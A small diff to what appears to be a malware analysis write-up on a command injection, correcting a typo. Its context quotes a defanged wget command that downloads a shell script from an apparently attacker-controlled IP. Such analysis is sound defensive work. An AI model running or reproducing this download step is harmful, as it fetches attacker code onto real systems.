@@ -68,7 +68,7 @@ This looks like a rather simple command injection.
 ```
 wget http://23.94.22[.]13/a/wget.sh
 ```
-- Once we have wget.sh we can the cat the contents. 
+- Once we have wget.sh we can 'cat' the contents. 
 
 ![wget_sh.png](/.attachments/wget_sh-de81ca11-748b-49d0-ba8f-dc57f28ea875.png)
 
